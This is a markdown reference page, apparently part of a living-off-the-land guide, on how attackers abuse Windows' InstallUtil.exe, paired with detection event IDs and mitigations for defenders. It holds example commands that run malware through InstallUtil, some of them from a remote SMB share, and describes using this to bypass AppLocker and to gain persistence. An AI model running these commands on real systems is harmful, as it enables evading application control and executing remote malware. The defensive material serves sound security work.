# InstallUtil.exe
## What is it?
*```InstallUtil.exe``` is a built-in .NET Framework utility used to install and uninstall .NET assemblies (applications or services).*
*It is typically used for managing Windows services and configuring applications that are built with .NET, making it a legitimate and useful tool for system administrators and application developers.*

## Legitimate Usage
- **Install .NET Applications** → Install or uninstall .NET applications and services (```InstallUtil /i MyApp.exe```).
- **Service Management** → Install services and configure their settings.
- **Uninstall .NET Applications** → Remove previously installed .NET applications and their components (```InstallUtil /u MyApp.exe```).
- **Configure Custom Installations** → Use the tool in custom installation scripts to automate deployment.

## How to abuse it
- **Malicious Payload Execution** → Attackers can use ```InstallUtil.exe``` to execute malicious payloads, as it allows running any .NET code embedded in an assembly (EXE or DLL).
- **Bypassing Security Controls** → Because ```InstallUtil.exe``` is a trusted system utility, security software might overlook it, making it effective for evading detection.
- **Persistence** → Attackers can use it to install persistent malware as a service or application on the target machine.
- **Privilege Escalation** → ```InstallUtil.exe``` can be used to execute arbitrary .NET code that may escalate privileges or bypass security mechanisms.
- **Lateral Movement** → Attackers can move malicious payloads across the network and execute them remotely using ```InstallUtil.exe```.

## Example attacks
### 1. Installing Malicious Payload
*Attackers can use ```InstallUtil.exe``` to install a malicious payload or malware by executing a malicious assembly (EXE or DLL).*
**Execute Malicious Payload via InstallUtil**

```
InstallUtil.exe /i \192.168.1.100\Malware\malware.exe
```

**Effect:**
- ```InstallUtil.exe``` installs and executes the malicious payload from the remote network share.
- The payload runs with elevated privileges, potentially gaining persistence as a service.

### 2. Persistence via Malicious Service Installation
*Attackers can use ```InstallUtil.exe``` to install a malicious service on the target machine, ensuring persistence.*
**Install Malicious Service**

```
InstallUtil.exe /i C:\Malware\malicious_service.exe
```

**Effect:**
- Installs a malicious service that will run automatically on startup, ensuring persistence even after reboots.

### 3. Lateral Movement via SMB
*Attackers can use ```InstallUtil.exe``` to remotely execute a malicious payload on another machine within the network.*
**Execute Malicious Payload Remotely via SMB**

```
InstallUtil.exe /i \192.168.1.100\Payload\malware.exe
```

**Effect:**
- ```InstallUtil.exe``` runs the malware remotely, allowing attackers to spread their attack across the network.

### 4. Bypassing Application Control
*Attackers can use ```InstallUtil.exe``` to bypass application control software or whitelisting mechanisms, as it is a legitimate and trusted Windows utility.*
**Bypass AppLocker by Using InstallUtil**

```
InstallUtil.exe /i C:\Malware\payload.dll
```

**Effect:**
- Even if execution of executables is restricted by AppLocker or Software Restriction Policies, ```InstallUtil.exe``` can still be used to run a malicious DLL.

### 5. Privilege Escalation via Malicious Assemblies
*Attackers can compile malicious .NET code that escalates privileges and execute it using ```InstallUtil.exe```.*
**Escalate Privileges via .NET Assembly**

```
InstallUtil.exe /i C:\Malware\PrivilegeEscalation.exe
```

**Effect:**
- The attacker executes a .NET assembly that escalates privileges, potentially gaining SYSTEM-level access.

# Detection & Mitigation
## Detection Methods
**Monitor InstallUtil.exe Usage**
- **Event ID 4688 (New Process Creation)** → Monitor for the creation of new processes, especially with ```InstallUtil.exe```.
- Look for unusual use of ```InstallUtil.exe``` that involves executing files from suspicious or uncommon locations (e.g., network shares).

**Monitor Service Installations**
- **Event ID 7045 (Service Installation)** → Detect the installation of new services that could indicate malicious persistence.
- **Event ID 4697 (Service Installed)** → Identify when services are installed via executable files such as malicious payloads.

**Monitor Unusual File Access**
- **Event ID 4663 (File Access)** → Watch for suspicious file accesses, such as the execution of remote payloads using ```InstallUtil.exe```.

## Mitigation Strategies
- **Restrict Use of InstallUtil.exe** → Limit the execution of ```InstallUtil.exe``` to authorized users and administrators, using application whitelisting tools like AppLocker or WDAC.
- **Monitor Network Shares** → Restrict or monitor SMB shares to prevent unauthorized remote execution.
- **Restrict Service Installation** → Use Group Policy or similar controls to restrict the installation of services on critical systems.
- **Use Security Monitoring Tools** → Leverage EDR and SIEM solutions to monitor for suspicious activity involving legitimate tools like ```InstallUtil.exe```.
